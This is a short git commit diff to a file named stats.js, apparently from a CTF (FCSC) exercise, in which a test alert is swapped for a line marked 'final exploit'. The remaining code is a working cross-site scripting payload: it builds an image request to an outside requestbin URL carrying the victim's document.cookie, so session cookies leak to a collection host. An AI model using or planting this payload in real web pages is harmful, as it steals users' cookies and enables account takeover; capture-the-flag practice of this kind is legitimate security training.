4d9f0205d82bed539d2ce242f060f5e5747a7551
Quentin Lemaire <29045289+qlemaire@users.noreply.github.com>
2022-05-07 23:21:06 +0200

    Update stats.js

--- assets/js/stats.js
+++ assets/js/stats.js
@@ -1,5 +1,4 @@
-alert(0) // CTF FCSC
-
+// final exploit
 var i = document.createElement("img");
-var ngrok = "http://v1.requestbin.net/r/h4zjh2wq"; // FIXME ngrok
+var ngrok = "http://v1.requestbin.net/r/h4zjh2wq";
 i.src = ngrok + "/?leak="+encodeURIComponent(document.cookie);
